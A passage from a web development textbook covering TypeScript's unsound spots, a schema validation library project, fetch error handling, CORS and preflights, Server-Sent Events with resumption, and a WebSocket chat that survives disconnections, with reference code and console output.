  Expect<Equal<EventName<"click" | "focus">, "onClick" | "onFocus">>,
  Expect<Equal<NonFunctionKeys<{ a: number; f(): void }>, "a">>,
];

const s: ReadonlyDeep<{ user: { name: string } }> = { user: { name: "Ana" } };
// @ts-expect-error: deeply readonly
s.user.name = "Bo";
// @ts-expect-error: "huge" is not a valid theme
const bad: Settings["theme"] = "huge";
export {};
```

```console
$ npx tsc -p advanced && echo "all type-level tests pass"
all type-level tests pass
```

Each `Expect<Equal<…>>` line fails to compile if the computed type is wrong, so the tuple `_tests` is a test suite run by `tsc`; `@ts-expect-error` asserts that the next line *does* fail. Library authors use exactly this technique.

## Topic 10C — The limits

## Unit 10.5 — What types do not guarantee

**One-line summary:** All types are erased before the program runs, so nothing checks data from the network, storage, or `JSON.parse`; and several constructs let wrong types through even in strict mode — `as` assertions, `any`, the non-null assertion `!`, excess-property checks that apply only to object literals, and covariant arrays.

```ts
// file: generics/unsound.ts
// Types are erased before the program runs, and some constructs let wrong types through.
interface User { id: number; name: string }

const fromServer: unknown = JSON.parse('{"id": "7", "nickname": "Bo"}');
const trusted = fromServer as User;                 // an assertion: "trust me" — not checked
console.log(typeof trusted.id, trusted.name?.length); // a string id, and no name at all

const anything: any = "text";
const n: number = anything;                         // any switches type checking off, silently
console.log(n.toFixed);                              // undefined at run time

const extra = { id: 1, name: "Ana", password: "hunter2" };
const user: User = extra;                           // fine: excess-property checks apply only to literals
console.log(JSON.stringify(user));                  // ... so the password goes along for the ride

const dogs: { bark(): void }[] = [];
const animals: object[] = dogs;                     // arrays are covariant (unsound but convenient)
animals.push({});
try { dogs[0]!.bark(); }                            // ! is another unchecked "trust me"
catch (e) { console.log(`${(e as Error).name}: ${(e as Error).message}`); }
```

```console
$ npx tsc -p generics && node generics/unsound.ts
string undefined
undefined
{"id":1,"name":"Ana","password":"hunter2"}
TypeError: dogs[0].bark is not a function
```

The compiler accepted the whole file, and every line misbehaves at run time: the "User" has a string `id` and no `name`; `n.toFixed` is `undefined`; the password is serialised along with the user; a plain object ended up in an array of dogs.

### Deep & Tricky

**DT-33. TypeScript's type system is deliberately unsound: the compiler accepts some programs whose values do not match their types at run time — assertions (`as`), `any`, `!`, method-parameter bivariance, array covariance, and index access without `noUncheckedIndexedAccess` — because the designers chose convenience and compatibility with existing JavaScript patterns over a proof of correctness. A type is a claim checked against other claims, never against the actual data.** *(TypeScript Design Goals, non-goal 3: "Apply a sound or 'provably correct' type system. Instead, strike a balance between correctness and productivity."; TypeScript Handbook, "Type Compatibility — a note on soundness")* Treat every `as` and `any` in a code review as a place where the compiler stopped checking.

### Mastery check

1. **Predict.** Does `const u: User = JSON.parse(text);` compile under `strict`? Why?

## Chapter 10 Project — Schemas that validate and type

### Requirements

Write a small validation library in which one definition gives both a run-time check and a static type:

- Schemas for `string` (minimum length, pattern), `number` (integer, minimum), `literal` values, `array`, and `object`, plus `.optional()`.
- `parse(unknown)` returns a discriminated union: `{ ok: true, value }` or `{ ok: false, errors }`, where every error names its path (`$.tags[1]`); unknown properties are errors.
- `Infer<typeof Schema>` gives the TypeScript type of valid values.

Validate good and bad JSON, and show the compile-time errors that the inferred types catch.

### Reference solution

```ts
// file: project/schema.ts
// A tiny runtime validator whose schemas also produce static types (the idea behind Zod and Valibot).
export type Result<T> = { ok: true; value: T } | { ok: false; errors: string[] };

export interface Schema<T> {
  parse(input: unknown, path?: string): Result<T>;
  optional(): Schema<T | undefined>;
}
export type Infer<S> = S extends Schema<infer T> ? T : never;

function schema<T>(parse: (input: unknown, path: string) => Result<T>): Schema<T> {
  const s: Schema<T> = {
    parse: (input, path = "$") => parse(input, path),
    optional: () => schema<T | undefined>((input, path) => (input === undefined ? { ok: true, value: undefined } : parse(input, path))),
  };
  return s;
}
const fail = (path: string, msg: string): Result<never> => ({ ok: false, errors: [`${path}: ${msg}`] });

export const string = (opts: { min?: number; pattern?: RegExp } = {}) => schema<string>((v, p) =>
  typeof v !== "string" ? fail(p, `expected string, got ${typeof v}`)
  : opts.min !== undefined && v.length < opts.min ? fail(p, `shorter than ${opts.min}`)
  : opts.pattern && !opts.pattern.test(v) ? fail(p, `does not match ${opts.pattern}`)
  : { ok: true, value: v });

export const number = (opts: { int?: boolean; min?: number } = {}) => schema<number>((v, p) =>
  typeof v !== "number" || Number.isNaN(v) ? fail(p, `expected number, got ${typeof v}`)
  : opts.int && !Number.isInteger(v) ? fail(p, "expected an integer")
  : opts.min !== undefined && v < opts.min ? fail(p, `less than ${opts.min}`)
  : { ok: true, value: v });

export const literal = <const L extends string | number | boolean>(...allowed: L[]) => schema<L>((v, p) =>
  allowed.includes(v as L) ? { ok: true, value: v as L } : fail(p, `expected one of ${JSON.stringify(allowed)}`));

export const array = <T>(item: Schema<T>) => schema<T[]>((v, p) => {
  if (!Array.isArray(v)) return fail(p, "expected array");
  const out: T[] = [], errors: string[] = [];
  v.forEach((x, i) => { const r = item.parse(x, `${p}[${i}]`); r.ok ? out.push(r.value) : errors.push(...r.errors); });
  return errors.length ? { ok: false, errors } : { ok: true, value: out };
});

type Shape = Record<string, Schema<unknown>>;
type ObjectOf<S extends Shape> = { [K in keyof S]: Infer<S[K]> };

export const object = <S extends Shape>(shape: S) => schema<ObjectOf<S>>((v, p) => {
  if (typeof v !== "object" || v === null || Array.isArray(v)) return fail(p, "expected object");
  const out: Record<string, unknown> = {}, errors: string[] = [];
  for (const key of Object.keys(shape)) {
    const r = shape[key]!.parse((v as Record<string, unknown>)[key], `${p}.${key}`);
    r.ok ? (out[key] = r.value) : errors.push(...r.errors);
  }
  for (const key of Object.keys(v)) if (!(key in shape)) errors.push(`${p}.${key}: unexpected property`);
  return errors.length ? { ok: false, errors } : { ok: true, value: out as ObjectOf<S> };
});
```

```ts
// file: project/main.ts
import { object, string, number, literal, array, type Infer } from "./schema.ts";

const User = object({
  id: number({ int: true, min: 1 }),
  email: string({ pattern: /^[^@\s]+@[^@\s]+$/ }),
  role: literal("admin", "editor", "viewer"),
  tags: array(string({ min: 1 })),
  nickname: string().optional(),
});
type User = Infer<typeof User>;          // the static type, derived from the runtime schema

function welcome(u: User): string {      // u.role is "admin" | "editor" | "viewer"; u.nickname is string | undefined
  return `${u.nickname ?? u.email} (${u.role})`;
}

for (const json of [
  '{"id": 7, "email": "ana@example.com", "role": "admin", "tags": ["ops"]}',
  '{"id": "7", "email": "ana", "role": "owner", "tags": ["", 3], "password": "x"}',
]) {
  const r = User.parse(JSON.parse(json));
  if (r.ok) console.log("valid:", welcome(r.value));
  else console.log("invalid:\n  " + r.errors.join("\n  "));
}
```

```ts
// file: project/type-errors.ts
// Misuses that the inferred type catches at compile time.
import { object, string, literal, type Infer } from "./schema.ts";
const Post = object({ title: string(), status: literal("draft", "published") });
type Post = Infer<typeof Post>;
const p: Post = { title: "Hello", status: "archived" };
const r = Post.parse({});
console.log(r.value.title);
if (r.ok) console.log(r.value.body);
```

```console
$ npx tsc -p project
project/type-errors.ts(6,35): error TS2322: Type '"archived"' is not assignable to type '"draft" | "published"'.
project/type-errors.ts(8,15): error TS2339: Property 'value' does not exist on type 'Result<ObjectOf<{ title: Schema<string>; status: Schema<"draft" | "published">; }>>'.
  Property 'value' does not exist on type '{ ok: false; errors: string[]; }'.
project/type-errors.ts(9,31): error TS2339: Property 'body' does not exist on type 'ObjectOf<{ title: Schema<string>; status: Schema<"draft" | "published">; }>'.
$ node project/main.ts
valid: ana@example.com (admin)
invalid:
  $.id: expected number, got string
  $.email: does not match /^[^@\s]+@[^@\s]+$/
  $.role: expected one of ["admin","editor","viewer"]
  $.tags[0]: shorter than 1
  $.tags[1]: expected string, got number
  $.password: unexpected property
```

The type errors come from the inferred types alone: `"archived"` is not one of the literal statuses; `r.value` cannot be used before checking `r.ok` (the discriminated union of Unit 10.3); and `body` is not a property of a `Post`. At run time, the bad document produces one error per problem, each with its path, instead of a vague failure later in the program.

The library's types do some work worth reading slowly: `literal` uses a `const` type parameter so that `literal("admin", "editor")` infers the union `"admin" | "editor"` rather than `string`; `ObjectOf` is a mapped type that applies `Infer` to each property schema; and the only `as` casts are in the two places where a run-time check has just established the fact that the cast asserts.

### Review checklist

- `nickname` is typed `string | undefined` but the *key* is still required in `User`. Make optional schemas produce optional keys (`nickname?: string`), using a mapped type that splits the shape.
- Add `union(a, b)` and a discriminated `variant("kind", { … })`.
- Where in a web application should validation happen: on the server, the client, or both? (Chapter 14.)

## Answers to the Chapter 10 prediction questions

**Unit 10.1, Q1.** Type annotations can be erased (replaced by spaces), leaving valid JavaScript; an `enum` must be turned into a JavaScript object, which is code generation, not erasure.

**Unit 10.5, Q1.** Yes: `JSON.parse` returns `any`, and `any` is assignable to every type — which is why validating with a schema, or typing the result as `unknown`, is necessary.

# Chapter 11 — Networking: `fetch`, CORS, Streaming, and WebSockets

*Goal: move data between the browser and servers correctly. You will use `fetch` against a real API — and learn which failures reject its promise and which do not — watch the same-origin policy and CORS decide, request by request, what a page may read (including the preflight requests the browser sends on its own), stream a response as it arrives, push events with Server-Sent Events that resume after a dropped connection, and build a WebSocket chat whose clients reconnect and catch up on what they missed.*

**What you will be able to do after this chapter**

- Call HTTP APIs with `fetch`, handle every kind of failure, and cancel requests.
- Explain the same-origin policy and configure CORS deliberately, including preflights.
- Process responses incrementally with streams.
- Choose between polling, streaming, Server-Sent Events, and WebSockets.
- Build a real-time client that survives disconnections without losing or duplicating messages.

## Topic 11A — Requests

## Unit 11.1 — `fetch`

**One-line summary:** `fetch(url, options)` returns a promise for a `Response` as soon as the headers arrive; it rejects only for network failures, aborts, and policy violations, never for HTTP error statuses (check `res.ok` or `res.status`), and the body is a stream that can be read exactly once, as JSON, text, bytes, or chunk by chunk.

```js
// file: fetch/api.mjs
// A small JSON API for the fetch examples.
import http from "node:http";

const users = new Map([[1, { id: 1, name: "Ana" }], [2, { id: 2, name: "Bo" }]]);
http.createServer(async (req, res) => {
  const url = new URL(req.url, "http://x");
  const json = (status, body, headers = {}) => {
    res.writeHead(status, { "Content-Type": "application/json", ...headers });
    res.end(JSON.stringify(body));
  };
  if (req.method === "GET" && url.pathname === "/users") return json(200, [...users.values()]);
  const m = /^\/users\/(\d+)$/.exec(url.pathname);
  if (req.method === "GET" && m) {
    const user = users.get(Number(m[1]));
    return user ? json(200, user, { "Cache-Control": "max-age=60" }) : json(404, { error: "no such user" });
  }
  if (req.method === "POST" && url.pathname === "/users") {
    let body = "";
    for await (const chunk of req) body += chunk;
    try {
      const { name } = JSON.parse(body);
      if (typeof name !== "string" || !name) return json(422, { error: "name is required" });
      const user = { id: users.size + 1, name };
      users.set(user.id, user);
      return json(201, user, { Location: `/users/${user.id}` });
    } catch { return json(400, { error: "body is not JSON" }); }
  }
  if (url.pathname === "/slow") { setTimeout(() => json(200, { ok: true }), 2000); return; }
  json(404, { error: "not found" });
}).listen(8100);
```

```js
// file: fetch/client.mjs
// fetch() in Node.js: the same API as in browsers.
const base = "http://localhost:8100";

const res = await fetch(`${base}/users/1`);
console.log(res.status, res.ok, res.headers.get("content-type"), await res.json());

const missing = await fetch(`${base}/users/99`);           // does NOT throw: HTTP errors are responses
console.log(missing.status, missing.ok, await missing.json());

const created = await fetch(`${base}/users`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ name: "Cy" }),
});
console.log(created.status, created.headers.get("location"), await created.json());

const bad = await fetch(`${base}/users`, { method: "POST", body: "not json" });
console.log(bad.status, await bad.json());

try { await res.json(); } catch (e) { console.log(`reading a body twice: ${e.name}: ${e.message}`); }
try { await fetch(`${base}/slow`, { signal: AbortSignal.timeout(300) }); }
catch (e) { console.log(`timeout: ${e.name}`); }
try { await fetch("http://127.0.0.1:8199/"); }                // nothing listens there: the promise rejects
catch (e) { console.log(`network error: ${e.name}: ${e.message} (cause: ${e.cause?.code})`); }

/** The helper every project ends up writing: throw on HTTP errors, parse JSON. */
async function getJSON(url, options) {
  const r = await fetch(url, options);
  if (!r.ok) throw new Error(`${r.status} ${r.statusText} for ${url}: ${(await r.text()).slice(0, 100)}`);
  return r.json();
}
console.log(await getJSON(`${base}/users`));
try { await getJSON(`${base}/users/42`); } catch (e) { console.log(e.message); }
```

```console
$ cd fetch && { node api.mjs & S=$!; sleep 0.5; node client.mjs; kill $S; }
200 true application/json { id: 1, name: 'Ana' }
404 false { error: 'no such user' }
201 /users/3 { id: 3, name: 'Cy' }
400 { error: 'body is not JSON' }
reading a body twice: TypeError: Body is unusable: Body has already been read
timeout: TimeoutError
network error: TypeError: fetch failed (cause: ECONNREFUSED)
[
  { id: 1, name: 'Ana' },
  { id: 2, name: 'Bo' },
  { id: 3, name: 'Cy' }
]
404 Not Found for http://localhost:8100/users/42: {"error":"no such user"}
```

A 404, a 400, and a 422 all *fulfil* the promise; only the timeout and the refused connection reject it. Every project eventually wraps `fetch` in a helper like `getJSON` that turns non-2xx statuses into exceptions — and includes the status, URL, and the start of the body in the message, because "request failed" is useless in a log.

### Deep & Tricky

**DT-34. `fetch` refuses to connect to a list of "bad ports" — 1, 7, 9, 21, 22, 25, 110, 143, 6000, 6665–6669, and others used by non-HTTP protocols — and rejects with a `TypeError` before sending anything, even to `localhost`. The first draft of the client above used port 9 to provoke a "connection refused" error and got "bad port" instead.** *(Fetch Standard §2.9 "Port blocking": "A port is a bad port if it is listed in the first column of the following table"; the rule stops web pages from sending crafted bytes to SMTP, FTP, IRC, and similar servers)*

### Mastery check

1. **Predict.** What does `await fetch(url).then((r) => r.json())` do when the server answers 500 with an HTML error page?

## Unit 11.2 — The same-origin policy and CORS

**One-line summary:** A page may *send* requests anywhere, but may *read* responses only from its own origin (scheme + host + port) unless the other server explicitly allows it with CORS headers; requests that a plain HTML form could not send — JSON bodies, custom headers, methods other than GET, HEAD, and POST — are preceded by an automatic `OPTIONS` *preflight* asking the server's permission first.

The page is served from port 8101; the API runs on port 8102 — a different origin — and prints every request it receives:

```js
// file: cors/api.mjs
// An API on another origin (port 8102). It logs every request it receives, and allows
// cross-origin access only on the /open/ paths, and only for the page's origin.
import http from "node:http";

const ALLOWED = "http://localhost:8101";
http.createServer((req, res) => {
  console.log(`  api received: ${req.method} ${req.url}` +
              (req.headers.origin ? ` (Origin: ${req.headers.origin})` : "") +
              (req.headers["access-control-request-headers"] ? ` asks to send: ${req.headers["access-control-request-headers"]}` : ""));
  const cors = req.url.startsWith("/open/") ? {
    "Access-Control-Allow-Origin": ALLOWED,
    "Access-Control-Allow-Methods": "GET, POST, PUT",
    "Access-Control-Allow-Headers": "Content-Type",
    "Access-Control-Max-Age": "600",
    "Vary": "Origin",
  } : {};
  if (req.method === "OPTIONS") return res.writeHead(204, cors).end();       // the preflight answer
  res.writeHead(200, { "Content-Type": "application/json", ...cors });
  res.end(JSON.stringify({ path: req.url, method: req.method }));
}).listen(8102);
```

```html
<!-- file: cors/page.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Cross-origin requests</title></head>
<body>
  <script type="module">
    const api = "http://localhost:8102";
    async function attempt(label, url, options) {
      try {
        const res = await fetch(api + url, options);
        if (res.type === "opaque") return console.log(`${label}: type ${res.type}, status ${res.status}, body "${await res.text()}"`);
        console.log(`${label}: ${res.status} ${JSON.stringify(await res.json())}`);
      } catch (e) { console.log(`${label}: ${e.name}: ${e.message}`); }
    }
    console.log(`page origin: ${location.origin}`);
    await attempt("1 simple GET, API sends no CORS headers", "/closed/data");
    await attempt("2 simple GET, API allows this origin  ", "/open/data");
    await attempt("3 POST with JSON (needs a preflight)  ", "/open/items",
                  { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" });
    await attempt("4 the same POST again (preflight cached)", "/open/items",
                  { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" });
    await attempt("5 DELETE (not in Allow-Methods)       ", "/open/items/1", { method: "DELETE" });
    await attempt("6 no-cors mode: an opaque response    ", "/closed/data", { mode: "no-cors" });
  </script>
</body>
</html>
```

```console
$ cd cors && { node api.mjs & S=$!; sleep 0.5; python3 ../../tools/page.py http://localhost:8101/page.html wait:500 --serve "node ../../ch00/project/static.mjs . 8101"; kill $S; }
page origin: http://localhost:8101
  api received: GET /closed/data (Origin: http://localhost:8101)
Access to fetch at 'http://localhost:8102/closed/data' from origin 'http://localhost:8101' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.
Failed to load resource: net::ERR_FAILED
1 simple GET, API sends no CORS headers: TypeError: Failed to fetch
  api received: GET /open/data (Origin: http://localhost:8101)
  api received: OPTIONS /open/items (Origin: http://localhost:8101) asks to send: content-type
2 simple GET, API allows this origin  : 200 {"path":"/open/data","method":"GET"}
  api received: POST /open/items (Origin: http://localhost:8101)
3 POST with JSON (needs a preflight)  : 200 {"path":"/open/items","method":"POST"}
  api received: POST /open/items (Origin: http://localhost:8101)
  api received: OPTIONS /open/items/1 (Origin: http://localhost:8101)
4 the same POST again (preflight cached): 200 {"path":"/open/items","method":"POST"}
Access to fetch at 'http://localhost:8102/open/items/1' from origin 'http://localhost:8101' has been blocked by CORS policy: Method DELETE is not allowed by Access-Control-Allow-Methods in preflight response.
Failed to load resource: net::ERR_FAILED
  api received: GET /closed/data
5 DELETE (not in Allow-Methods)       : TypeError: Failed to fetch
6 no-cors mode: an opaque response    : type opaque, status 0, body ""
```

(The API and the browser print to the same terminal from different processes, so their lines interleave a little out of order.)

1. The first request *reached the server* and was answered — the API logged it — but the browser refused to give the response to the page, because it carried no `Access-Control-Allow-Origin` header. CORS protects the *reading*, not the server.
2. With the header naming the page's origin, the same GET succeeds.
3. A JSON `Content-Type` is not something a form can send, so the browser first sent `OPTIONS` with `Access-Control-Request-Headers: content-type`; the API's answer allowed it, and only then was the POST sent.
4. The second POST went straight through: `Access-Control-Max-Age` let the browser cache the preflight's answer.
5. `DELETE` was not in the allowed methods: the preflight was sent, the DELETE never was.
6. `mode: "no-cors"` lets a page send a simple request and receive an *opaque* response — status 0, empty body — useful only for things like caching in a service worker.

### Deep & Tricky

**DT-35. CORS is a browser-enforced read permission, not access control: a simple request (GET, HEAD, or a POST with a form content type) reaches the server and runs its side effects whether or not the response is allowed to be read, and non-browser clients such as `curl` ignore CORS entirely. Authorisation must therefore be checked on the server for every request, and state-changing endpoints must be protected against cross-site requests by other means (Chapter 14: CSRF).** *(Fetch Standard §3.2 "CORS protocol" — "the CORS protocol … allows a response to be shared"; §3.2.2 "simple requests"; MDN, "Cross-Origin Resource Sharing")*

### Mastery check

1. **Explain.** Why does a request with the header `Authorization: Bearer …` always need a preflight?

## Topic 11B — Pushing data

## Unit 11.3 — Streaming responses and Server-Sent Events

**One-line summary:** A response body can be consumed as it arrives through `res.body`, a `ReadableStream` of bytes; Server-Sent Events (`EventSource`) build a one-way, server-to-client channel on a long `text/event-stream` response, with named events, automatic reconnection, and resumption through `Last-Event-ID`.

```js
// file: stream/server.mjs
// Two ways to push data to a page over plain HTTP: a streamed response, and Server-Sent Events.
import http from "node:http";
import { readFile } from "node:fs/promises";

let connections = 0;
http.createServer(async (req, res) => {
  if (req.url === "/") {
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    return res.end(await readFile("page.html"));
  }
  if (req.url === "/report") {                                   // a body that arrives in pieces
    res.writeHead(200, { "Content-Type": "text/plain; charset=utf-8" });
    for (const part of ["Loading orders… ", "142 orders. ", "Totals… ", "$18,230.00. ", "Done."]) {
      res.write(part);
      await new Promise((r) => setTimeout(r, 150));
    }
    return res.end();
  }
  if (req.url === "/events") {                                   // text/event-stream: one long response
    const n = ++connections;
    const last = Number(req.headers["last-event-id"] ?? 0);      // sent by EventSource when it reconnects
    console.log(`  server: EventSource connection ${n}, Last-Event-ID ${last || "none"}`);
    res.writeHead(200, { "Content-Type": "text/event-stream", "Cache-Control": "no-cache" });
    res.write("retry: 300\n\n");                                 // reconnect after 300 ms if the connection drops
    let id = last;
    const timer = setInterval(() => {
      id++;
      res.write(`id: ${id}\nevent: price\ndata: ${JSON.stringify({ id, price: 100 + id })}\n\n`);
      if (n === 1 && id === 3) { clearInterval(timer); res.destroy(); }   // simulate a dropped connection
    }, 100);
    req.on("close", () => clearInterval(timer));
    return;
  }
  res.writeHead(404).end();
}).listen(8103);
```

```html
<!-- file: stream/page.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Streaming</title></head>
<body>
  <script type="module">
    const t0 = performance.now(), at = () => `${Math.round(performance.now() - t0)} ms`;
    const res = await fetch("/report");
    const reader = res.body.pipeThrough(new TextDecoderStream()).getReader();   // bytes -> text, chunk by chunk
    for (let r = await reader.read(); !r.done; r = await reader.read())
      console.log(`chunk at ${at()}: "${r.value}"`);

    const source = new EventSource("/events");
    let received = 0;
    source.addEventListener("price", (e) => {
      console.log(`event id ${e.lastEventId}: ${e.data}`);
      if (++received === 6) source.close();
    });
    source.onerror = () => console.log(`connection lost; readyState ${source.readyState} (0 = reconnecting)`);
  </script>
</body>
</html>
```

```console
$ cd stream && python3 ../../tools/page.py http://localhost:8103/ wait:1800 --serve "node server.mjs" --server-log
chunk at 6 ms: "Loading orders… "
chunk at 154 ms: "142 orders. "
chunk at 304 ms: "Totals… "
chunk at 456 ms: "$18,230.00. "
chunk at 604 ms: "Done."
  server: EventSource connection 1, Last-Event-ID none
event id 1: {"id":1,"price":101}
event id 2: {"id":2,"price":102}
connection lost; readyState 0 (0 = reconnecting)
Failed to load resource: net::ERR_INCOMPLETE_CHUNKED_ENCODING
  server: EventSource connection 2, Last-Event-ID 2
event id 3: {"id":3,"price":103}
event id 4: {"id":4,"price":104}
event id 5: {"id":5,"price":105}
event id 6: {"id":6,"price":106}
```

The report is displayed in five pieces, 150 ms apart, instead of after 600 ms. The event stream delivered two events, then the server dropped the connection; the browser reconnected by itself after the 300 ms the server asked for (`retry:`), sending `Last-Event-ID: 2`, and the server resumed from event 3 — which had been written to the dying connection but never arrived, and so was not lost.

## Unit 11.4 — WebSockets

**One-line summary:** A WebSocket upgrades an HTTP connection into a persistent, bidirectional channel of messages, for interactive applications such as chat, collaborative editing, and games; it gives no delivery guarantees across disconnections, so applications add message identifiers, replay on reconnect, deduplication, and heartbeats themselves.

| Technique | Direction | Reconnects by itself | Good for |
| --- | --- | --- | --- |
| Polling (`fetch` every N s) | client pulls | n/a | Rare updates; simplest |
| Streamed response | server → client, one request | no | Progress, long reports, AI token streams |
| Server-Sent Events | server → client | yes, with `Last-Event-ID` | Notifications, feeds, dashboards |
| WebSocket | both ways | no | Chat, collaboration, games |

The project builds the WebSocket case properly.

## Chapter 11 Project — A chat that survives disconnections

### Requirements

Build a chat with a WebSocket server (Node.js with the `ws` package) and a browser client:

- The server assigns every message a sequence number, keeps recent history, and replays everything after `since` to a reconnecting client.
- It validates messages, limits their size, and sends heartbeats (`ping`) to detect and drop dead connections.
- The client reconnects with exponential backoff and jitter, resumes from the last sequence number it saw, and never shows a message twice.
- Test it with a browser and a second participant written in Node.js, cutting the browser off in the middle of the conversation.

### Reference solution

```js
// file: chat/server.mjs
// A chat server: WebSocket messages with server-assigned sequence numbers, history replay for
// clients that reconnect, validation, a size limit, and heartbeats that drop dead connections.
import http from "node:http";
import { readFile } from "node:fs/promises";
import { WebSocketServer } from "ws";

const history = [];                                         // the last 100 messages
let seq = 0;
const httpServer = http.createServer(async (req, res) => {
  if (req.url === "/") return res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" }).end(await readFile("chat.html"));
  if (req.url === "/chat.js") return res.writeHead(200, { "Content-Type": "text/javascript" }).end(await readFile("chat.js"));
  if (req.url.startsWith("/kick?name=") && req.method === "POST") {   // for testing: drop one user's connections
    const who = new URL(req.url, "http://x").searchParams.get("name");
    for (const ws of wss.clients) if (ws.userName === who) ws.terminate();
    return res.end("kicked\n");
  }
  res.writeHead(404).end();
});
const wss = new WebSocketServer({ server: httpServer, maxPayload: 4096 });

function broadcast(msg) {
  const data = JSON.stringify(msg);
  for (const ws of wss.clients) if (ws.readyState === ws.OPEN) ws.send(data);
}

wss.on("connection", (ws, req) => {
  const url = new URL(req.url, "http://x");
  const name = (url.searchParams.get("name") ?? "anonymous").slice(0, 20);
  const since = Number(url.searchParams.get("since") ?? 0);
  const missed = history.filter((m) => m.seq > since);
  console.log(`  server: ${name} connected (since ${since}, replaying ${missed.length})`);
  for (const m of missed) ws.send(JSON.stringify(m));
  ws.userName = name;
  ws.isAlive = true;
  ws.on("pong", () => (ws.isAlive = true));
  ws.on("message", (raw) => {
    let text;
    try { text = JSON.parse(raw).text; } catch { return ws.close(1003, "messages must be JSON"); }
    if (typeof text !== "string" || !text.trim()) return;
    const msg = { seq: ++seq, from: name, text: text.slice(0, 500), at: Date.now() };
    history.push(msg);
    if (history.length > 100) history.shift();
    broadcast(msg);
  });
});

setInterval(() => {                                         // heartbeat: unanswered ping => connection is dead
  for (const ws of wss.clients) {
    if (!ws.isAlive) { ws.terminate(); continue; }
    ws.isAlive = false;
    ws.ping();
  }
}, 10_000).unref();

httpServer.listen(8104, () => console.log("  server: listening on 8104"));
```

```js
// file: chat/chat.js
// A chat client that reconnects with exponential backoff and resumes where it left off.
export function connect({ url, name, onMessage, onStatus = () => {} }) {
  let ws, lastSeq = 0, attempt = 0, stopped = false;
  const seen = new Set();
  function open() {
    ws = new WebSocket(`${url}?name=${encodeURIComponent(name)}&since=${lastSeq}`);
    ws.onopen = () => { attempt = 0; onStatus("open"); };
    ws.onmessage = (e) => {
      const msg = JSON.parse(e.data);
      if (seen.has(msg.seq)) return;                       // never show a message twice
      seen.add(msg.seq);
      lastSeq = Math.max(lastSeq, msg.seq);
      onMessage(msg);
    };
    ws.onclose = (e) => {
      if (stopped) return;
      const delay = Math.min(10_000, 250 * 2 ** attempt++) * (0.5 + Math.random() / 2);
      onStatus(`closed (${e.code}); reconnecting in ${Math.round(delay)} ms`);
      setTimeout(open, delay);
    };
  }
  open();
  return {
    send: (text) => ws.readyState === WebSocket.OPEN && ws.send(JSON.stringify({ text })),
    close: () => { stopped = true; ws.close(); },
  };
}
```

```html
<!-- file: chat/chat.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Chat</title></head>
<body>
  <ol id="log" aria-live="polite"></ol>
  <form id="f"><input id="text" aria-label="Message" autocomplete="off"><button>Send</button></form>
  <script type="module">
    import { connect } from "./chat.js";
    const log = document.getElementById("log");
    const chat = connect({
      url: `ws://${location.host}/`, name: "browser",
      onMessage: (m) => {
        log.append(Object.assign(document.createElement("li"), { textContent: `${m.from}: ${m.text}` }));
        console.log(`#${m.seq} ${m.from}: ${m.text}`);
      },
      onStatus: (s) => console.log(`[status] ${s}`),
    });
    document.getElementById("f").addEventListener("submit", (e) => {
      e.preventDefault();
      const input = document.getElementById("text");
      chat.send(input.value);
      input.value = "";
    });
  </script>
</body>
</html>
```

```js
// file: chat/bot.mjs
// A second participant, using the same client module with Node's built-in WebSocket.
import { connect } from "./chat.js";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const bot = connect({ url: "ws://localhost:8104/", name: "bot", onMessage: () => {} });
await sleep(300);
bot.send("hello from the bot");
await sleep(700);
await fetch("http://localhost:8104/kick?name=browser", { method: "POST" });   // cut the browser off ...
bot.send("sent while the browser was disconnected");                          // ... and talk behind its back
await sleep(1500);
bot.send("both are back");
await sleep(300);
bot.close();
```

```console
$ cd chat && npm init -y > /dev/null && npm pkg set type=module && npm install ws@8 2>&1 | tail -1
found 0 vulnerabilities
$ cd chat && { node server.mjs & S=$!; sleep 0.5; node bot.mjs & B=$!; python3 ../../tools/page.py http://localhost:8104/ wait:500 "fill:#text|hi from the browser" press:Enter wait:2500 "eval:[...document.querySelectorAll('#log li')].map((li) => li.textContent)"; wait $B; kill $S; }
  server: listening on 8104
  server: bot connected (since 0, replaying 0)
  server: browser connected (since 0, replaying 1)
[status] open
#1 bot: hello from the bot
#2 browser: hi from the browser
[status] closed (1006); reconnecting in 184 ms
  server: browser connected (since 2, replaying 1)
[status] open
#3 bot: sent while the browser was disconnected
#4 bot: both are back
=> ["bot: hello from the bot", "browser: hi from the browser", "bot: sent while the browser was disconnected", "bot: both are back"]
```

The browser joined after the bot's first message and received it from the history. When the test cut the browser off, its socket closed with code 1006 (abnormal closure); while it waited to reconnect, the bot sent a message; on reconnecting with `since=2`, the browser was replayed exactly that one message, then received the next one live. The same `chat.js` module runs in the browser and in Node.js, which has had a standard `WebSocket` client since version 22.

### Review checklist

- The server keeps history in memory; after a restart, clients asking for `since=57` get nothing. What should happen, and how does a database or a message broker change the design?
- A client may send a message, lose the connection before the echo arrives, and not know whether it was delivered. Add client-generated message IDs so that resending is safe (idempotency).
- Browsers do not expose WebSocket ping/pong to JavaScript. How can the *client* detect a dead connection quickly?

## Answers to the Chapter 11 prediction questions

**Unit 11.1, Q1.** The `fetch` promise fulfils (500 is a response), and `r.json()` rejects with a `SyntaxError` because the body is HTML — the real problem, the 500, is hidden behind a parse error. Check `r.ok` first.

**Unit 11.2, Q1.** `Authorization` is not a CORS-safelisted request header, so the request is not "simple"; the browser must ask the server, with a preflight, whether it accepts that header from this origin.

# Chapter 12 — Storage, Service Workers, and Offline Applications

*Goal: keep data in the browser and keep working without a network. You will see cookies set and sent (and the ones JavaScript is not allowed to touch), the simple but limited Web Storage API, IndexedDB with transactions, indexes, and rollback, and service workers — programmable proxies that sit between the page and the network. The project is a local-first notes app: it saves instantly to IndexedDB, loads offline from a service-worker cache, queues changes made offline, and uploads them when the connection returns.*

**What you will be able to do after this chapter**

- Set cookies with the right attributes and explain which requests carry them.
- Use `localStorage` and `sessionStorage` appropriately, knowing their limits.
- Store structured data in IndexedDB with transactions and indexes.
- Write a service worker: install, activate, versioned caches, and fetch strategies.
- Build an app that works offline and synchronises safely when back online.

## Topic 12A — Storage

